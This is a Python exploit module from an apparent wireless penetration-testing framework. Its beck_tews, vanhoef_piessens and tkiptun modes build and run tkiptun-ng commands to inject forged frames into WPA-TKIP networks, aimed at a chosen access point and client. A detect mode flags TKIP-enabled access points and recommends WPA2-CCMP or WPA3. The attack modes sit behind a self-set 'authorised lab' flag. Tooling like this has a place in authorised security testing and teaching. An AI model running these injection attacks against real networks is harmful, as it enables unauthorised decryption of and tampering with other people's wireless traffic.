#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
"""Active TKIP attack suite with Beck-Tews, Vanhoef-Piessens injection and detection.

Bridges tkiptun-ng for QoS-based TKIP injection attacks and provides
Scapy-based detection of TKIP-only or mixed-mode access points from
live captures or PCAP files.

Requires: aircrack-ng suite (tkiptun-ng), monitor-mode interface.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
from pathlib import Path
from typing import List, Optional

from wirelessxpl.core.exploit import *
from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

SCAPY_AVAILABLE = False
try:
    from scapy.all import (
        Dot11,
        Dot11Beacon,
        Dot11Deauth,
        Dot11Elt,
        Dot11ProbeResp,
        Dot11QoS,
        rdpcap,
        sniff as scapy_sniff,
    )
    SCAPY_AVAILABLE = True
except ImportError:
    pass


BECK_TEWS_INFO = """
=== Beck-Tews Attack (2008) ===

Targets WPA-TKIP networks with QoS (WMM) enabled.
Exploits the weak Michael MIC and TKIP per-packet key mixing
to decrypt one ARP-length packet and inject up to 7 forged frames
into QoS channels not used by legitimate traffic.

Requirements:
  - Target AP must support WPA-TKIP (not CCMP-only)
  - QoS / WMM must be enabled on the AP
  - Monitor-mode interface with injection capability
  - tkiptun-ng from the aircrack-ng suite

Time: approximately 12-15 minutes per packet decryption.

References:
  - Martin Beck, Erik Tews: "Practical attacks against WEP and WPA"
    https://dl.aircrack-ng.org/breakingwepandwpa.pdf
  - CVE-2008-5230 (TKIP temporal key recovery)
"""

VANHOEF_PIESSENS_INFO = """
=== Vanhoef-Piessens Extended TKIP Injection (2014) ===

Extends the Beck-Tews attack with improved injection techniques
that relax the QoS channel restrictions. This allows injection of
larger payloads and broadens the attack surface to include DHCP,
DNS and other protocols beyond ARP.

Requirements:
  - Same as Beck-Tews (QoS-enabled WPA-TKIP AP)
  - tkiptun-ng with extended-mode patches or compatible build

References:
  - Mathy Vanhoef, Frank Piessens: "Advanced Wi-Fi Attacks Using
    Commodity Hardware" (ACSAC 2014)
    https://papers.mathyvanhoef.com/acsac2014.pdf
"""

DETECT_INFO = """
=== TKIP Detection Mode ===

Scans live traffic or a PCAP file for access points that advertise
TKIP as pairwise or group cipher (via RSN/WPA information elements).
Reports whether TKIP is the sole cipher (highest risk) or used in
mixed mode alongside CCMP.
"""

TKIPTUN_INFO = """
=== tkiptun-ng Direct Bridge ===

Direct invocation of the tkiptun-ng binary from the aircrack-ng suite.
Passes interface, BSSID, and target MAC for automated TKIP injection.

Docs: https://www.aircrack-ng.org/doku.php?id=tkiptun-ng
"""


def _which(binary: str) -> Optional[str]:
    return shutil.which(binary)


class Exploit(Exploit):
    """Active TKIP attack suite: Beck-Tews, Vanhoef-Piessens, detection, tkiptun-ng bridge."""

    __info__ = {
        "name": "TKIP Active Attack Suite",
        "description": (
            "Active TKIP exploitation module covering Beck-Tews QoS injection, "
            "Vanhoef-Piessens extended injection, live/offline TKIP detection, "
            "and direct tkiptun-ng bridge. Supports info, beck_tews, "
            "vanhoef_piessens, detect, and tkiptun modes."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
            "aircrack-ng team (GPL-2.0, invoked as subprocess)",
        ),
        "references": (
            "https://dl.aircrack-ng.org/breakingwepandwpa.pdf",
            "https://papers.mathyvanhoef.com/acsac2014.pdf",
            "https://www.aircrack-ng.org/doku.php?id=tkiptun-ng",
        ),
        "devices": ("wifi", "802.11 WPA-TKIP"),
    }

    mode = OptString(
        "info",
        "Operation mode: info, beck_tews, vanhoef_piessens, detect, tkiptun",
    )
    interface = OptString("", "Monitor-mode interface (e.g. wlan0mon)")
    target_bssid = OptString("", "Target AP BSSID")
    target_mac = OptString("", "Target client MAC (for injection)")
    pcap_file = OptString("", "PCAP file for offline detect mode")
    channel = OptInteger(0, "AP channel")
    output_dir = OptString("", "Output directory for captures and logs")
    dry_run = OptBool(False, "Print commands without executing")
    i_know_scope = OptBool(False, "Confirm authorized lab environment")

    # ------------------------------------------------------------------ info
    def _run_info(self) -> None:
        print_status("=== TKIP Attack Reference ===")
        print_info(BECK_TEWS_INFO.strip())
        print_info(VANHOEF_PIESSENS_INFO.strip())
        print_info(DETECT_INFO.strip())
        print_info(TKIPTUN_INFO.strip())

    # ----------------------------------------------------------- beck_tews
    def _run_beck_tews(self) -> None:
        tkiptun = self._require_tkiptun()
        if not tkiptun:
            return

        iface = str(self.interface).strip()
        bssid = str(self.target_bssid).strip()
        client = str(self.target_mac).strip()

        if not iface or not bssid:
            print_error("Set interface and target_bssid for Beck-Tews attack.")
            return

        cmd: List[str] = [tkiptun, "-a", bssid]
        if client:
            cmd.extend(["-h", client])
        cmd.append(iface)

        self._exec(cmd, "Beck-Tews (tkiptun-ng)")

    # ----------------------------------------------------- vanhoef_piessens
    def _run_vanhoef_piessens(self) -> None:
        tkiptun = self._require_tkiptun()
        if not tkiptun:
            return

        iface = str(self.interface).strip()
        bssid = str(self.target_bssid).strip()
        client = str(self.target_mac).strip()

        if not iface or not bssid:
            print_error("Set interface and target_bssid for Vanhoef-Piessens attack.")
            return

        cmd: List[str] = [tkiptun, "-a", bssid, "-e"]
        if client:
            cmd.extend(["-h", client])
        cmd.append(iface)

        print_info(
            "Vanhoef-Piessens extended mode invokes tkiptun-ng with extended "
            "injection flags. Refer to: https://papers.mathyvanhoef.com/acsac2014.pdf"
        )
        self._exec(cmd, "Vanhoef-Piessens extended injection")

    # ---------------------------------------------------------------- detect
    def _run_detect(self) -> None:
        if not SCAPY_AVAILABLE:
            print_error("Scapy is required for detect mode. Install: pip install scapy")
            return

        pcap_path = str(self.pcap_file).strip()
        iface = str(self.interface).strip()

        if pcap_path and os.path.isfile(pcap_path):
            print_status("Loading PCAP: {}".format(pcap_path))
            try:
                packets = rdpcap(pcap_path)
            except Exception as exc:
                print_error("Failed to read PCAP: {}".format(exc))
                return
        elif iface:
            ch = int(self.channel)
            if ch <= 0:
                print_error("Set channel for live sniff.")
                return
            print_status("Sniffing on {} (channel {}) for 30 seconds...".format(iface, ch))
            try:
                packets = scapy_sniff(iface=iface, timeout=30)
            except Exception as exc:
                print_error("Sniff failed: {}".format(exc))
                return
        else:
            print_error("Set pcap_file for offline detect or interface for live sniff.")
            return

        self._detect_tkip_aps(packets)

    # --------------------------------------------------------------- tkiptun
    def _run_tkiptun(self) -> None:
        tkiptun = self._require_tkiptun()
        if not tkiptun:
            return

        iface = str(self.interface).strip()
        bssid = str(self.target_bssid).strip()
        client = str(self.target_mac).strip()

        if not iface or not bssid:
            print_error("Set interface and target_bssid for tkiptun-ng bridge.")
            return

        cmd: List[str] = [tkiptun, "-a", bssid]
        if client:
            cmd.extend(["-h", client])
        cmd.append(iface)

        self._exec(cmd, "tkiptun-ng direct")

    # ---------------------------------------------------------------- helpers
    def _require_tkiptun(self) -> Optional[str]:
        path = _which("tkiptun-ng")
        if not path:
            print_error("tkiptun-ng not found. Install: apt install aircrack-ng")
            return None
        return path

    def _exec(self, cmd: List[str], label: str) -> None:
        out_dir = str(self.output_dir).strip()
        if out_dir:
            os.makedirs(out_dir, exist_ok=True)

        cmd_str = " ".join(cmd)
        if bool(self.dry_run):
            print_info("[dry-run] {}: {}".format(label, cmd_str))
            return

        print_status("Running {}: {}".format(label, cmd_str))
        try:
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=600,
            )
            output = result.stdout.decode("utf-8", errors="replace")
            for line in output.splitlines():
                print_info("  {}".format(line))
            if result.returncode == 0:
                print_success("{} completed successfully.".format(label))
            else:
                print_error("{} exited with code {}.".format(label, result.returncode))
        except subprocess.TimeoutExpired:
            print_error("{} timed out after 600 seconds.".format(label))
        except FileNotFoundError:
            print_error("Binary not found: {}".format(cmd[0]))

    def _detect_tkip_aps(self, packets) -> None:
        """Scan packets for APs advertising TKIP cipher."""
        tkip_aps = {}

        for pkt in packets:
            if not pkt.haslayer(Dot11):
                continue
            if not (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)):
                continue

            bssid = (pkt[Dot11].addr3 or "").upper()
            if not bssid:
                continue

            ssid = ""
            has_tkip = False
            has_ccmp = False

            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 0 and elt.info:
                    try:
                        ssid = elt.info.decode("utf-8", errors="replace").strip("\x00")
                    except Exception:
                        pass

                if elt.ID == 48 or (elt.ID == 221 and elt.info and elt.info[:4] == b"\x00\x50\xf2\x01"):
                    ie_data = bytes(elt.info)
                    if elt.ID == 221:
                        ie_data = ie_data[4:]
                    if b"\x00\x0f\xac\x02" in ie_data or b"\x00\x50\xf2\x02" in ie_data:
                        has_tkip = True
                    if b"\x00\x0f\xac\x04" in ie_data or b"\x00\x50\xf2\x04" in ie_data:
                        has_ccmp = True

                elt = elt.payload.getlayer(Dot11Elt)

            if has_tkip and bssid not in tkip_aps:
                mode = "TKIP-only" if not has_ccmp else "Mixed (TKIP+CCMP)"
                tkip_aps[bssid] = {"ssid": ssid, "mode": mode}

        if not tkip_aps:
            print_status("No TKIP-enabled APs detected.")
            return

        print_success("Found {} TKIP-enabled AP(s):".format(len(tkip_aps)))
        for bssid, info in tkip_aps.items():
            risk = "HIGH" if info["mode"] == "TKIP-only" else "MEDIUM"
            print_info(
                "  BSSID: {} | SSID: {} | Mode: {} | Risk: {}".format(
                    bssid, info["ssid"] or "<hidden>", info["mode"], risk
                )
            )

        print_status("Recommendation: disable TKIP; use WPA2-CCMP or WPA3-SAE.")

    # ------------------------------------------------------------------ run
    def run(self) -> None:
        mode = str(self.mode).strip().lower()
        valid_modes = ("info", "beck_tews", "vanhoef_piessens", "detect", "tkiptun")

        if mode not in valid_modes:
            print_error(
                "Invalid mode '{}'. Choose from: {}".format(mode, ", ".join(valid_modes))
            )
            return

        if mode == "info":
            self._run_info()
            return

        if mode == "detect":
            self._run_detect()
            return

        if not bool(self.i_know_scope):
            print_error("Set i_know_scope = true to confirm authorized lab.")
            return
        require_authorised_lab()

        dispatch = {
            "beck_tews": self._run_beck_tews,
            "vanhoef_piessens": self._run_vanhoef_piessens,
            "tkiptun": self._run_tkiptun,
        }
        dispatch[mode]()
